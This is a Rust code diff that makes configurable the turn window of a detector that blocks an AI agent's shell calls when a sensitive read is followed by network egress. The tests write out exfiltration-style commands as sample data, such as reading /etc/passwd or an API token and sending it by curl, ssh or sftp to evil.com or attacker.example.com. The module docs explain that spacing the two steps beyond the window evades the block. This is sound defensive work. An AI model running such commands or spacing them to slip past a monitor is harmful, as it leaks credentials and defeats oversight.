@@ -33,6 +33,31 @@
 //! `RiskChainAccumulator` is authoritative for multi-step chain blocking within its recent-turn
 //! window. `TrajectoryRiskSlot` / `TrajectorySentinel` remain authoritative for cumulative global
 //! risk level across the whole session.
+//!
+//! # Cross-turn window default (#6603)
+//!
+//! The window is configurable via `[tools.shell] risk_chain_window_turns` (falls back to
+//! [`DEFAULT_CROSS_TURN_WINDOW_TURNS`] when unset). Its default of `3` is deliberately narrower
+//! than the sibling `[security.trajectory] window_turns` default of `8`
+//! (`TrajectorySentinelConfig`, `crates/zeph-config/src/security.rs`): that window feeds a
+//! decaying *soft* risk score used for alerting, while this window feeds a *hard block*
+//! decision. A wider window here would let more unrelated old activity combine with new activity
+//! into a false-positive block; `3` was chosen to keep the default behavior unchanged from the
+//! #6561 fix that introduced cross-turn detection. Operators who want detection to survive a
+//! longer gap between the two legs of a chain can raise this value explicitly. Setting it to `0`
+//! is a supported, deliberate opt-out that disables cross-turn detection outright (every call is
+//! pruned on the very next [`advance_turn`](RiskChainAccumulator::advance_turn), reproducing the
+//! pre-#6561 same-turn-only behavior) — callers that construct the accumulator directly
+//! (`agent_setup::wire_risk_chain`) log a warning naming #6561 when this resolves to `0`, since
+//! the value has no other operator-visible signal.
+//!
+//! This is a bounded mitigation, not a complete fix: an attacker fully controls the spacing
+//! between the sensitive read and the network egress, so spacing the two legs further apart than
+//! the configured window still evades the block entirely. This residual is accepted and bounded
+//! (an unrelated read from beyond the window can never combine with new activity — see
+//! [`RiskChainAccumulator::advance_turn`]), not something this module claims to close. Keying the
+//! window off in-context message span (surviving compaction/summarization) instead of raw turn
+//! count might narrow the residual further but is not implemented here — see #6603.
 
 use std::collections::VecDeque;
 use std::sync::Arc;
@@ -40,6 +65,7 @@ use std::sync::Arc;
 use parking_lot::Mutex;
 use tracing;
 
+use crate::config::ShellConfig;
 use crate::policy_gate::RiskSignalQueue;
 
 /// Signal code for `exfil_read_then_send` chain.
@@ -53,14 +79,16 @@ const SIGNAL_CRED_THEN_EGRESS: u8 = 11;
 /// surviving calls (see [`RiskChainAccumulator::advance_turn`]).
 const MAX_CALLS: usize = 20;
 
-/// Number of turns a recorded call stays "live" for cross-turn chain detection (#6561).
+/// Default number of turns a recorded call stays "live" for cross-turn chain detection (#6561),
+/// used when `[tools.shell] risk_chain_window_turns` is unset (#6603).
 ///
 /// [`RiskChainAccumulator::advance_turn`] prunes any call older than this many turns. A chain
 /// split across turns (e.g. sensitive read in turn N, network egress in turn N+1..=N+3) is still
 /// caught as long as both legs fall within this window; a read from many turns ago that never
 /// led anywhere eventually ages out, so unrelated old activity cannot combine with new activity
-/// into a false positive indefinitely.
-const CROSS_TURN_WINDOW_TURNS: u64 = 3;
+/// into a false positive indefinitely. See the module docs for why `3` (not the sibling
+/// `TrajectorySentinelConfig`'s `8`) was chosen as the default.
+pub const DEFAULT_CROSS_TURN_WINDOW_TURNS: u64 = 3;
 
 /// Risk categories assigned to individual tool calls during classification.
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -93,7 +121,7 @@ pub struct RiskChainVerdict {
 struct ScoredCall {
     tags: Vec<RiskTag>,
     /// Turn index this call was recorded in — used by `advance_turn` to prune calls that have
-    /// aged out of [`CROSS_TURN_WINDOW_TURNS`].
+    /// aged out of [`DEFAULT_CROSS_TURN_WINDOW_TURNS`].
     turn: u64,
 }
 
@@ -105,7 +133,7 @@ struct Inner {
     turn: u64,
     /// Name of the chain pattern currently pushed into the signal queue, if any (#6561
     /// dedup fix). While the same chain stays matched across several subsequent `record()`
-    /// calls (it can remain live for up to `CROSS_TURN_WINDOW_TURNS` turns now), the queue
+    /// calls (it can remain live for up to the configured window's turn count), the queue
     /// push must fire once per detection, not once per call — otherwise a single logical
     /// chain can flood `RiskSignalQueue`/`TrajectorySentinel` with dozens of duplicate pushes
     /// over its live window, amplifying one detection into a session-wide false escalation.
@@ -128,9 +156,10 @@ struct Inner {
 /// # Examples
 ///
 /// ```
+/// use zeph_tools::ShellConfig;
 /// use zeph_tools::risk_chain::RiskChainAccumulator;
 ///
-/// let acc = RiskChainAccumulator::new(None);
+/// let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
 /// let v = acc.record("bash", "cat /etc/passwd", 0.7);
 /// assert!(!v.should_block); // single sensitive read, score < threshold
 /// ```
@@ -138,6 +167,9 @@ struct Inner {
 pub struct RiskChainAccumulator {
     inner: Arc<Mutex<Inner>>,
     signal_queue: Option<RiskSignalQueue>,
+    /// Number of turns a recorded call stays "live" (see [`DEFAULT_CROSS_TURN_WINDOW_TURNS`]
+    /// and the module docs for rationale). Fixed for the lifetime of the accumulator.
+    window_turns: u64,
 }
 
 impl RiskChainAccumulator {
@@ -145,12 +177,31 @@ impl RiskChainAccumulator {
     ///
     /// `signal_queue` — when `Some`, chain detections push a signal code into
     /// the shared queue so the `TrajectorySentinel` in `zeph-core` is notified.
+    ///
+    /// `shell_config` — the same `ShellConfig` used to build the session's `ShellExecutor`.
+    /// `risk_chain_window_turns` is resolved from it internally (falling back to
+    /// [`DEFAULT_CROSS_TURN_WINDOW_TURNS`] when unset), mirroring how `ShellExecutor::new`
+    /// resolves `risk_chain_threshold` — callers pass the config they already have rather than
+    /// extracting and threading the raw field themselves (#6603).
     #[must_use]
-    pub fn new(signal_queue: Option<RiskSignalQueue>) -> Self {
+    pub fn new(signal_queue: Option<RiskSignalQueue>, shell_config: &ShellConfig) -> Self {
+        let window_turns = shell_config
+            .risk_chain_window_turns
+            .unwrap_or(DEFAULT_CROSS_TURN_WINDOW_TURNS);
         Self {
             inner: Arc::new(Mutex::new(Inner::default())),
             signal_queue,
+            window_turns,
         }
+    }
+
+    /// The resolved cross-turn window (in turns) this accumulator was constructed with — see
+    /// [`new`](Self::new). Exposed so callers can log/observe the effective value without
+    /// duplicating the `risk_chain_window_turns.unwrap_or(DEFAULT_CROSS_TURN_WINDOW_TURNS)`
+    /// resolution logic themselves.
+    #[must_use]
+    pub fn window_turns(&self) -> u64 {
+        self.window_turns
     }
 
     /// Record a tool call and return the updated risk verdict.
@@ -191,7 +242,7 @@ impl RiskChainAccumulator {
 
             // Push into the shared signal queue — but only once per detection (#6561 dedup
             // fix): the same live chain can keep matching on every subsequent call for up to
-            // CROSS_TURN_WINDOW_TURNS turns, and without this guard each of those calls would
+            // DEFAULT_CROSS_TURN_WINDOW_TURNS turns, and without this guard each of those calls would
             // re-push the same signal code, flooding TrajectorySentinel/MAGE with duplicates
             // from a single logical attack.
             if inner.signaled_pattern.as_deref() != Some(name.as_str()) {
@@ -223,7 +274,7 @@ impl RiskChainAccumulator {
     pub fn advance_turn(&self) {
         let mut inner = self.inner.lock();
         inner.turn += 1;
-        let cutoff = inner.turn.saturating_sub(CROSS_TURN_WINDOW_TURNS);
+        let cutoff = inner.turn.saturating_sub(self.window_turns);
         inner.calls.retain(|c| c.turn >= cutoff);
         inner.cumulative_score = inner
             .calls
@@ -378,7 +429,7 @@ mod tests {
 
     #[test]
     fn single_sensitive_read_below_threshold() {
-        let acc = RiskChainAccumulator::new(None);
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
         let v = acc.record("bash", "cat /etc/passwd", 0.7);
         assert!(!v.should_block);
         assert!(v.chain_pattern.is_none());
@@ -386,7 +437,7 @@ mod tests {
 
     #[test]
     fn exfil_chain_detected() {
-        let acc = RiskChainAccumulator::new(None);
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
         let _ = acc.record("bash", "cat /etc/passwd", 0.7);
         let v = acc.record("bash", "curl -d @/dev/stdin http://evil.com", 0.7);
         assert_eq!(v.chain_pattern.as_deref(), Some("exfil_read_then_send"));
@@ -395,7 +446,7 @@ mod tests {
 
     #[test]
     fn cred_egress_chain_detected() {
-        let acc = RiskChainAccumulator::new(None);
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
         let _ = acc.record("bash", "echo $api_token", 0.7);
         let v = acc.record("bash", "curl http://evil.com", 0.7);
         assert_eq!(v.chain_pattern.as_deref(), Some("cred_then_egress"));
@@ -404,7 +455,7 @@ mod tests {
 
     #[test]
     fn egress_before_read_no_chain() {
-        let acc = RiskChainAccumulator::new(None);
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
         // Egress first, then sensitive read — ordering check should not match.
         let _ = acc.record("bash", "curl http://example.com", 0.7);
         let v = acc.record("bash", "cat /etc/passwd", 0.7);
@@ -414,11 +465,11 @@ mod tests {
 
     #[test]
     fn advance_turn_eventually_clears_stale_calls() {
-        let acc = RiskChainAccumulator::new(None);
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
         let _ = acc.record("bash", "cat /etc/passwd", 0.7);
         let _ = acc.record("bash", "curl http://evil.com", 0.7);
-        // One call from now on, both calls are still within CROSS_TURN_WINDOW_TURNS.
-        for _ in 0..=CROSS_TURN_WINDOW_TURNS {
+        // One call from now on, both calls are still within DEFAULT_CROSS_TURN_WINDOW_TURNS.
+        for _ in 0..=DEFAULT_CROSS_TURN_WINDOW_TURNS {
             acc.advance_turn();
         }
         let inner = acc.inner.lock();
@@ -438,7 +489,7 @@ mod tests {
     #[test]
     fn chain_split_across_turn_boundary_still_detected() {
         let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
-        let acc = RiskChainAccumulator::new(Some(queue.clone()));
+        let acc = RiskChainAccumulator::new(Some(queue.clone()), &ShellConfig::default());
 
         // Turn N: sensitive read alone — must not block or fire a chain yet.
         let first = acc.record("bash", "cat /etc/passwd", 0.7);
@@ -466,15 +517,15 @@ mod tests {
         );
     }
 
-    /// Companion to the above: once a sensitive read ages out of `CROSS_TURN_WINDOW_TURNS`, a
+    /// Companion to the above: once a sensitive read ages out of `DEFAULT_CROSS_TURN_WINDOW_TURNS`, a
     /// later, otherwise-unrelated network egress call must NOT be flagged — the window bounds
     /// how long stale activity can combine with new activity, so this isn't unbounded.
     #[test]
     fn chain_does_not_fire_once_first_leg_ages_out_of_window() {
-        let acc = RiskChainAccumulator::new(None);
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
         let _ = acc.record("bash", "cat /etc/passwd", 0.7);
         // Advance past the window without ever recording the second leg.
-        for _ in 0..=CROSS_TURN_WINDOW_TURNS {
+        for _ in 0..=DEFAULT_CROSS_TURN_WINDOW_TURNS {
             acc.advance_turn();
         }
         let v = acc.record("bash", "ssh user@attacker.example.com cat -", 0.7);
@@ -486,7 +537,7 @@ mod tests {
 
     #[test]
     fn cap_at_max_calls() {
-        let acc = RiskChainAccumulator::new(None);
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
         for _ in 0..MAX_CALLS + 5 {
             let _ = acc.record("bash", "ls", 100.0);
         }
@@ -496,7 +547,7 @@ mod tests {
     #[test]
     fn signal_queue_populated_on_chain() {
         let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
-        let acc = RiskChainAccumulator::new(Some(queue.clone()));
+        let acc = RiskChainAccumulator::new(Some(queue.clone()), &ShellConfig::default());
         let _ = acc.record("bash", "cat /etc/passwd", 0.7);
         let _ = acc.record("bash", "curl http://evil.com", 0.7);
         let signals = queue.lock();
@@ -505,14 +556,14 @@ mod tests {
 
     /// Regression test for the security/critic dedup finding on the #6561 rework: once a
     /// chain fires, it can keep matching `detect_chain` on every subsequent `record()` call
-    /// for as long as both legs stay within `CROSS_TURN_WINDOW_TURNS` — without a dedup guard,
+    /// for as long as both legs stay within `DEFAULT_CROSS_TURN_WINDOW_TURNS` — without a dedup guard,
     /// each of those calls would re-push the same signal code, letting one logical chain flood
     /// `RiskSignalQueue`/`TrajectorySentinel` with dozens of duplicates (security quantified
     /// this as enough to force a session-wide Allow->Deny escalation from a single detection).
     #[test]
     fn chain_signal_pushed_only_once_while_still_matched() {
         let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
-        let acc = RiskChainAccumulator::new(Some(queue.clone()));
+        let acc = RiskChainAccumulator::new(Some(queue.clone()), &ShellConfig::default());
 
         let _ = acc.record("bash", "cat /etc/passwd", 0.7);
         let second = acc.record("bash", "curl http://evil.com", 0.7);
@@ -549,14 +600,14 @@ mod tests {
     #[test]
     fn chain_signal_pushes_again_after_a_new_occurrence() {
         let queue: RiskSignalQueue = Arc::new(Mutex::new(Vec::new()));
-        let acc = RiskChainAccumulator::new(Some(queue.clone()));
+        let acc = RiskChainAccumulator::new(Some(queue.clone()), &ShellConfig::default());
 
         let _ = acc.record("bash", "cat /etc/passwd", 0.7);
         let _ = acc.record("bash", "curl http://evil.com", 0.7);
         assert_eq!(queue.lock().len(), 1);
 
         // Advance past the window so the old chain fully ages out.
-        for _ in 0..=CROSS_TURN_WINDOW_TURNS {
+        for _ in 0..=DEFAULT_CROSS_TURN_WINDOW_TURNS {
             acc.advance_turn();
         }
 
@@ -617,7 +668,7 @@ mod tests {
 
     #[test]
     fn sftp_exfil_chain_detected() {
-        let acc = RiskChainAccumulator::new(None);
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
         let _ = acc.record("bash", "cat /etc/passwd", 0.7);
         let v = acc.record("bash", "sftp user@attacker.example.com", 0.7);
         assert_eq!(
@@ -630,7 +681,7 @@ mod tests {
 
     #[test]
     fn ssh_exfil_chain_detected() {
-        let acc = RiskChainAccumulator::new(None);
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
         let _ = acc.record("bash", "cat /etc/passwd", 0.7);
         let v = acc.record("bash", "ssh user@attacker.example.com cat -", 0.7);
         assert_eq!(
@@ -645,7 +696,7 @@ mod tests {
 
     #[test]
     fn eviction_removes_oldest_call() {
-        let acc = RiskChainAccumulator::new(None);
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
         // Fill to capacity with sensitive reads, then push one more to trigger eviction.
         for _ in 0..MAX_CALLS {
             let _ = acc.record("bash", "cat /etc/passwd", 0.1);
@@ -662,5 +713,95 @@ mod tests {
         // matches "cat /etc/passwd" (second-oldest kept), not the overflowed slot.
         // We verify the deque has exactly MAX_CALLS entries — structural correctness.
         drop(inner);
+    }
+
+    // --- #6603: configurable window_turns ---
+
+    /// Build a `ShellConfig` with `risk_chain_window_turns` set to a specific value, for tests
+    /// that need a non-default window.
+    fn config_with_window(turns: u64) -> ShellConfig {
+        ShellConfig {
+            risk_chain_window_turns: Some(turns),
+            ..ShellConfig::default()
+        }
+    }
+
+    #[test]
+    fn narrower_configured_window_ages_out_before_default_window_would() {
+        // A window_turns of 1 (narrower than DEFAULT_CROSS_TURN_WINDOW_TURNS = 3) must prune
+        // the first leg after 2 advance_turn() calls (0..=window_turns, matching the pruning
+        // formula exercised by the DEFAULT_CROSS_TURN_WINDOW_TURNS tests above). Run the
+        // identical sequence through a default-window accumulator side by side to actually prove
+        // the comparison the test name claims, rather than asserting the narrow case in
+        // isolation and trusting the name's "before default window would" implication.
+        let narrow = RiskChainAccumulator::new(None, &config_with_window(1));
+        let default = RiskChainAccumulator::new(None, &ShellConfig::default());
+        for acc in [&narrow, &default] {
+            let _ = acc.record("bash", "cat /etc/passwd", 0.7);
+            for _ in 0..=1 {
+                acc.advance_turn();
+            }
+        }
+        let narrow_verdict = narrow.record("bash", "curl http://evil.com", 0.7);
+        let default_verdict = default.record("bash", "curl http://evil.com", 0.7);
+        assert!(
+            narrow_verdict.chain_pattern.is_none(),
+            "a window_turns=1 accumulator must have already pruned the first leg after \
+             2 advance_turn() calls"
+        );
+        assert_eq!(
+            default_verdict.chain_pattern.as_deref(),
+            Some("exfil_read_then_send"),
+            "at the same point (2 advance_turn() calls), the default window (3) must still \
+             consider the first leg live — proving the narrow window aged out strictly earlier, \
+             not just that it eventually ages out on its own"
+        );
+    }
+
+    #[test]
+    fn wider_configured_window_still_detects_chain_the_default_would_miss() {
+        // A window_turns wider than the default must keep a chain leg live for longer than
+        // DEFAULT_CROSS_TURN_WINDOW_TURNS turns would allow.
+        let acc = RiskChainAccumulator::new(
+            None,
+            &config_with_window(DEFAULT_CROSS_TURN_WINDOW_TURNS * 2),
+        );
+        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
+        for _ in 0..=DEFAULT_CROSS_TURN_WINDOW_TURNS {
+            acc.advance_turn();
+        }
+        let v = acc.record("bash", "curl http://evil.com", 0.7);
+        assert_eq!(
+            v.chain_pattern.as_deref(),
+            Some("exfil_read_then_send"),
+            "a wider configured window must still detect a chain whose first leg would have \
+             aged out of the default window"
+        );
+    }
+
+    #[test]
+    fn zero_window_turns_disables_cross_turn_detection() {
+        // window_turns = 0 is a legitimate opt-out: every advance_turn() prunes all calls
+        // recorded before the current turn, reproducing the pre-#6561 per-turn-only behavior.
+        let acc = RiskChainAccumulator::new(None, &config_with_window(0));
+        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
+        acc.advance_turn();
+        let v = acc.record("bash", "curl http://evil.com", 0.7);
+        assert!(
+            v.chain_pattern.is_none(),
+            "window_turns=0 must prune the first leg on the very next advance_turn()"
+        );
+    }
+
+    #[test]
+    fn window_turns_accessor_falls_back_to_default_when_unset() {
+        let acc = RiskChainAccumulator::new(None, &ShellConfig::default());
+        assert_eq!(acc.window_turns(), DEFAULT_CROSS_TURN_WINDOW_TURNS);
+    }
+
+    #[test]
+    fn window_turns_accessor_reflects_configured_value() {
+        let acc = RiskChainAccumulator::new(None, &config_with_window(7));
+        assert_eq!(acc.window_turns(), 7);
     }
 }
